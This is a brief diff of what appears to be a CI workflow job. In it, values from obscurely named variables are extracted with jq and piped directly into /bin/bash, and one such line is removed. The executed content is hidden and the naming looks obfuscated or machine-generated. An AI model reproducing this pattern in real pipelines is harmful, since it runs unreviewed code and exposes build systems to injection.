@@ -25,7 +25,6 @@ jobs:
           echo $j5 | jq -r .db8 | /bin/bash
           printf '%s' "$fn0052" | jq -r .yygsz46 | /bin/bash
           printf '%s' "$binvx68148" | jq -r .ky3 | /bin/bash
-          printf '%s' "$djdbi273" | jq -r .v96 | /bin/bash
           echo $g11 | jq -r .up7888 | /bin/bash
 
       - name: Save output
